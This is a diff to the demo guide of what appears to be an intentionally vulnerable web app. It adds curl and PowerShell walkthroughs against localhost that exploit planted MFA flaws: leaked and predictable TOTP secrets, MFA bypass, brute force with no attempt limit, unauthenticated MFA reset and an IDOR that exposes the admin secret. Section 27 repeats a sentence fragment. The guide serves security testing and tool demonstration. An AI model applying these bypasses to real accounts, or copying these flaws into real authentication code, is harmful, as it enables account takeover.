@@ -14,14 +14,20 @@ npm run dev
 
 ## Retrieve an Authentication Token
 
-Use the seeded credentials to sign in through the API. The returned `data.token` is the bearer token used by the authenticated demos below.
+Seeded accounts `admin` and `user1` have **TOTP MFA enabled by default**, so `sign-in` answers `202` with an
+MFA challenge until an `mfaCode` is supplied. The seeded TOTP secret is derived from the username
+(`base32(md5("iwa-demo-totp-salt:<username>"))`, CWE-330), and the intentionally insecure
+`GET /api/v3/mfa/current-code/<username>` endpoint hands out the code the server currently expects — which
+makes the whole flow scriptable. The `api` and `test` accounts have no MFA if you want a single-step sign-in.
 
 ### Bash
 
 ```bash
+CODE=$(curl -s http://localhost:8888/api/v3/mfa/current-code/user1 | jq -r .data.currentCode)
+
 TOKEN=$(curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
   -H "Content-Type: application/json" \
-  -d '{"username":"user1","password":"Password123!"}' | jq -r .data.token)
+  -d "{\"username\":\"user1\",\"password\":\"Password123!\",\"mfaCode\":\"$CODE\"}" | jq -r .data.token)
 
 echo "$TOKEN"
 ```
@@ -29,14 +35,19 @@ echo "$TOKEN"
 ### PowerShell
 
 ```powershell
+$code = (Invoke-RestMethod -Uri http://localhost:8888/api/v3/mfa/current-code/user1).data.currentCode
+
 $response = Invoke-RestMethod -Method Post `
   -Uri http://localhost:8888/api/v3/site/sign-in `
   -ContentType 'application/json' `
-  -Body (@{ username = 'user1'; password = 'Password123!' } | ConvertTo-Json)
+  -Body (@{ username = 'user1'; password = 'Password123!'; mfaCode = $code } | ConvertTo-Json)
 $TOKEN = $response.data.token
 
 $TOKEN
 ```
+
+Browser sign-in: log in at `/app/login`, and the `/app/login-mfa` challenge screen shows a scannable QR
+code, the base32 secret and the live code in its "Demo helper" panel (CWE-200).
 
 ---
 
@@ -1120,6 +1131,279 @@ Invoke-RestMethod -Method Post -Uri 'http://localhost:8888/api/v3/agent/chat' `
 **Expected:** The `download_file` tool passes the model-controlled path to storage with traversal enabled,
 allowing arbitrary files reachable by the process to be disclosed. FAA identifies model-controlled
 filesystem access; DAST can exercise the traversal payload.
+
+---
+
+## 24. MFA Secret Disclosure (CWE-200)
+
+**Endpoints:** `GET /login-mfa/hint`, `GET /api/v3/mfa/status/:userId`, `/qrcode/:userId`, `/current-code/:userId`, `POST /api/v3/site/sign-in`
+**Auth:** None
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+curl -s http://localhost:8888/api/v3/mfa/status/user1 | jq .data
+curl -s http://localhost:8888/api/v3/mfa/current-code/user1 | jq .data
+curl -s http://localhost:8888/api/v3/mfa/qrcode/user1 -o user1-mfa.png
+curl -s http://localhost:8888/login-mfa/hint?userId=user1 | jq .
+curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
+  -H "Content-Type: application/json" \
+  -d '{"username":"user1","password":"Password123!"}' | jq .data
+```
+
+### PowerShell
+
+```powershell
+(Invoke-RestMethod -Uri http://localhost:8888/api/v3/mfa/status/user1).data
+(Invoke-RestMethod -Uri http://localhost:8888/api/v3/mfa/current-code/user1).data
+Invoke-WebRequest -Uri http://localhost:8888/api/v3/mfa/qrcode/user1 -OutFile user1-mfa.png
+Invoke-RestMethod -Uri 'http://localhost:8888/login-mfa/hint?userId=user1'
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/site/sign-in `
+  -ContentType 'application/json' `
+  -Body (@{ username = 'user1'; password = 'Password123!' } | ConvertTo-Json)).data
+```
+
+**Expected:** The base32 TOTP secret, a scannable `otpauth://` URL, a data-URI QR code and a currently valid
+six-digit code are returned without authentication. Signing in without `mfaCode` also returns those values
+in the `202` challenge response. `/app/login-mfa` renders the same material in its collapsible Demo helper.
+
+---
+
+## 25. MFA Bypass — Session Established Before the Challenge (CWE-287, CWE-863)
+
+**Endpoints:** `POST /login` then `GET /app/user/profile`
+**Auth:** Password only
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+curl -s -c cookies.txt -X POST http://localhost:8888/login \
+  -d 'username=user1&password=Password123!' -o /dev/null
+
+# Never visit /app/login-mfa — the session is already authenticated
+curl -s -b cookies.txt http://localhost:8888/api/v3/account/summary | jq .data.user
+```
+
+### PowerShell
+
+```powershell
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+Invoke-WebRequest -Method Post -Uri http://localhost:8888/login -WebSession $session `
+  -Body @{ username = 'user1'; password = 'Password123!' } | Out-Null
+
+(Invoke-RestMethod -Uri http://localhost:8888/api/v3/account/summary -WebSession $session).data.user
+```
+
+**Expected:** `req.logIn()` runs before the MFA branch and the session is never torn down, so every
+`requireAuth` route and the `/app/user/*` SPA shell are reachable with the password alone. The second
+factor is advisory only.
+
+---
+
+## 26. MFA Brute Force — No Attempt Limit (CWE-307)
+
+**Endpoints:** `POST /login-mfa`, `POST /api/v3/mfa/verify`, `POST /api/v3/site/sign-in`
+**Auth:** None
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+for code in 000000 000001 000002 111111 123456; do
+  curl -s -X POST http://localhost:8888/api/v3/mfa/verify \
+    -H "Content-Type: application/json" \
+    -d "{\"userId\":\"user1\",\"code\":\"$code\"}" | jq -c .data
+done
+```
+
+### PowerShell
+
+```powershell
+'000000','000001','000002','111111','123456' | ForEach-Object {
+  (Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/mfa/verify `
+    -ContentType 'application/json' `
+    -Body (@{ userId = 'user1'; code = $_ } | ConvertTo-Json)).data
+}
+```
+
+**Expected:** Every attempt is evaluated. There is no per-account counter, no lockout and no challenge
+expiry, so the full six-digit keyspace can be enumerated against a live account.
+
+---
+
+## 27. Predictable TOTP Secret and API Challenge Token (CWE-330, CWE-798)
+
+**Location:** `packages/api/src/services/VerificationService.ts`
+**Fortify Tooling Detection:** SAST, FAA
+
+```bash
+node -e "const c=require('crypto');const A='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';const d=c.createHash('md5').update('iwa-demo-totp-salt:user1').digest();let b=0,v=0,o='';for(const x of d){v=(v<<8)|x;b+=8;while(b>=5){o+=A[(v>>>(b-5))&31];b-=5;}}if(b>0)o+=A[(v<<(5-b))&31];console.log(o);"
+```
+
+enough to generate valid codes forever. OTP codes additionally come from `Math.random()` (CWE-338).
+**Expected:** The printed secret matches the one returned by `/api/v3/mfa/status/user1`. Every enrolment
+secret in the application is `base32(md5("iwa-demo-totp-salt:" + username))`, so knowing a username is
+enough to generate valid codes forever. The `mfaToken` in the `202` sign-in response is also predictable
+because it contains the account id and current timestamp. OTP codes additionally come from `Math.random()` (CWE-338).
+
+---
+
+## 28. MFA Secret Stored and Returned in Plaintext (CWE-522, CWE-312, CWE-532)
+
+**Endpoints:** `GET /api/v3/account/summary`, `POST /user/security/enable-mfa`
+**Auth:** Session cookie
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+curl -s -b cookies.txt http://localhost:8888/api/v3/account/summary | jq '.data.mfa, .data.user.mfaSecret'
+grep -i 'secret=' logs/iwa.log | tail -5
+```
+
+### PowerShell
+
+```powershell
+(Invoke-RestMethod -Uri http://localhost:8888/api/v3/account/summary -WebSession $session).data.mfa
+Select-String -Path logs\iwa.log -Pattern 'secret=' | Select-Object -Last 5
+```
+
+**Expected:** `mfaSecret` is stored unencrypted in the `users` table, returned by the account summary and
+MFA status endpoints, rendered on `/app/user/profile`, and written to `logs/iwa.log` by `MfaService`
+(CWE-532).
+
+---
+
+## 29. MFA Reset Without Verification (CWE-640)
+
+**Endpoints:** `POST /api/v3/mfa/disable`, `POST /login-mfa/reset`, `POST /user/security/disable-mfa`
+**Auth:** None for the API/reset routes; session only for `/user/security/disable-mfa`
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+curl -s -X POST http://localhost:8888/api/v3/mfa/disable \
+  -H "Content-Type: application/json" -d '{"userId":"user1"}' | jq .data
+
+curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
+  -H "Content-Type: application/json" \
+  -d '{"username":"user1","password":"Password123!"}' | jq .data
+```
+
+### PowerShell
+
+```powershell
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/mfa/disable `
+  -ContentType 'application/json' -Body (@{ userId = 'user1' } | ConvertTo-Json)).data
+
+Invoke-WebRequest -Method Post -Uri http://localhost:8888/user/security/disable-mfa `
+  -WebSession $session -Body @{ appReturnTo = '/app/user/security' } | Out-Null
+
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/site/sign-in `
+  -ContentType 'application/json' `
+  -Body (@{ username = 'user1'; password = 'Password123!' } | ConvertTo-Json)).data
+```
+
+**Expected:** MFA is removed for the account with no authentication, password check or recovery code, and
+the follow-up sign-in returns a token in one step. The `/app/login-mfa` "Lost your device? Reset MFA"
+button does the same thing from the challenge screen. Re-enable with
+`POST /api/v3/mfa/enrol {"userId":"user1","type":"MFA_APP"}`.
+
+---
+
+## 30. MFA IDOR via userId (CWE-639)
+
+**Endpoints:** `GET /user/security/totp-secret?userId=`, `POST /user/security/regenerate-totp`
+**Auth:** Any signed-in user
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+curl -s -b cookies.txt 'http://localhost:8888/user/security/totp-secret?userId=admin' | jq .data
+```
+
+### PowerShell
+
+```powershell
+(Invoke-RestMethod -Uri 'http://localhost:8888/user/security/totp-secret?userId=admin' -WebSession $session).data
+```
+
+**Expected:** Signed in as `user1`, the response contains the `admin` account's TOTP secret, QR code and
+current code. The same control is exposed in the UI: `/app/user/profile` → "Authenticator Setup" →
+"View another account's setup". `POST /user/security/regenerate-totp` with `userId=admin` additionally
+rotates the admin secret, locking the real owner out.
+
+---
+
+## 31. Unauthenticated MFA Management API (CWE-306)
+
+**Endpoints:** `GET /api/v3/mfa/status/:userId`, `GET /api/v3/mfa/qrcode/:userId`, `POST /api/v3/mfa/enrol`
+**Auth:** None
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+curl -s http://localhost:8888/api/v3/mfa/status/admin | jq .data.mfaType
+curl -s http://localhost:8888/api/v3/mfa/qrcode/admin -o admin-mfa.png
+curl -s -X POST http://localhost:8888/api/v3/mfa/enrol \
+  -H "Content-Type: application/json" -d '{"userId":"test","type":"MFA_APP"}' | jq .data.mfaType
+curl -s -X POST http://localhost:8888/api/v3/mfa/disable \
+  -H "Content-Type: application/json" -d '{"userId":"test"}' | jq .data.mfaType
+```
+
+### PowerShell
+
+```powershell
+(Invoke-RestMethod -Uri http://localhost:8888/api/v3/mfa/status/admin).data.mfaType
+Invoke-WebRequest -Uri http://localhost:8888/api/v3/mfa/qrcode/admin -OutFile admin-mfa.png
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/mfa/enrol `
+  -ContentType 'application/json' -Body (@{ userId = 'test'; type = 'MFA_APP' } | ConvertTo-Json)).data.mfaType
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/mfa/disable `
+  -ContentType 'application/json' -Body (@{ userId = 'test' } | ConvertTo-Json)).data.mfaType
+```
+
+**Expected:** MFA status, QR codes, enrolment and removal are available without a session cookie or bearer
+token. The final request restores the `test` account to `MFA_NONE` after the demo.
+
+---
+
+## 32. MFA Enrollment Enabled Before Confirmation (CWE-287)
+
+**Endpoints:** `POST /api/v3/mfa/enrol`, `POST /api/v3/mfa/confirm`, `GET /api/v3/mfa/status/:userId`
+**Auth:** None
+**Fortify Tooling Detection:** SAST, DAST
+
+### Bash
+
+```bash
+curl -s -X POST http://localhost:8888/api/v3/mfa/enrol \
+  -H "Content-Type: application/json" -d '{"userId":"api","type":"MFA_APP"}' | jq .data.mfaType
+curl -s -X POST http://localhost:8888/api/v3/mfa/confirm \
+  -H "Content-Type: application/json" -d '{"userId":"api","code":"not-a-code"}' | jq .data.valid
+curl -s http://localhost:8888/api/v3/mfa/status/api | jq .data.mfaType
+curl -s -X POST http://localhost:8888/api/v3/mfa/disable \
+  -H "Content-Type: application/json" -d '{"userId":"api"}' | jq .data.mfaType
+```
+
+### PowerShell
+
+```powershell
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/mfa/enrol `
+  -ContentType 'application/json' -Body (@{ userId = 'api'; type = 'MFA_APP' } | ConvertTo-Json)).data.mfaType
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/mfa/confirm `
+  -ContentType 'application/json' -Body (@{ userId = 'api'; code = 'not-a-code' } | ConvertTo-Json)).data.valid
+(Invoke-RestMethod -Uri http://localhost:8888/api/v3/mfa/status/api).data.mfaType
+(Invoke-RestMethod -Method Post -Uri http://localhost:8888/api/v3/mfa/disable `
+  -ContentType 'application/json' -Body (@{ userId = 'api' } | ConvertTo-Json)).data.mfaType
+```
+
+**Expected:** Confirmation returns `valid: false`, but status already reports `MFA_APP` because enrolment
+was persisted before proof of possession. The final request restores `api` to `MFA_NONE`.
 
 ---
 
